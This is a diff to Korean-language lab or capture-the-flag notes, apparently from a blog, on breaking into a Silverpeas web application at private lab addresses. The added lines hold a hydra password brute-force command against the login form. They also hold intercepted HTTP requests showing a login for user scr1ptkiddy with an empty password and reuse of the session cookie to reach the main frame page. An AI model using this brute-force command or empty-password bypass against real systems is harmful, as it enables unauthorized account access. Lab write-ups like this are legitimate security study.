@@ -248,6 +248,13 @@ http://10.10.178.80:8080/silverpeas/defaultLogin.jsp
 - 로그인 테스트
   http://10.10.178.80:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=1
 
+# hydra 로그인 프루브 포싱
+
+hydra -l scr1ptkiddy -P passwords.txt 10.10.136.50 http-post-form \
+"/silverpeas/jsp/login.jsp:username=^USER^&password=^PASS^&DomainId=0:Location"
+
+# Google CEV 발견 -> scr1ptkiddy 로그인 시 password 없이 로그인 가능
+
 # 버프 스위트
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/9283f92b-10a8-4cf3-958a-c34c16a86502/image.png)
@@ -267,4 +274,26 @@ Accept-Encoding: gzip, deflate, br
 Cookie: JSESSIONID=ynxIq7QIzMeWyFR1tQ1FZCq9e9DT0Ks1TlnSIJn2.ebabc79c6d2a
 Connection: keep-alive
 
-Login=silveradmin&Password=&DomainId=0
+Login=scr1ptkiddy&Password=&DomainId=0
+
+# scr1ptkiddy
+
+# 응답 쿠키 : ynxIq7QIzMeWyFR1tQ1FZCq9e9DT0Ks1TlnSIJn2.ebabc79c6d2a -> 인증 됨
+
+GET /silverpeas/Main//look/jsp/MainFrame.jsp HTTP/1.1
+Host: 10.10.136.50:8080
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10*15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/\_;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.136.50:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=2
+Accept-Encoding: gzip, deflate, br
+Cookie: JSESSIONID=ynxIq7QIzMeWyFR1tQ1FZCq9e9DT0Ks1TlnSIJn2.ebabc79c6d2a; defaultDomain=0; svpLogin=scr1ptkiddy
+Connection: keep-alive
+
+# 접근 가능
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/f8600306-85aa-419e-b879-576bf18e81c8/image.png)
+
+http://10.10.136.50:8080/silverpeas/look/jsp/MainFrame.jsp
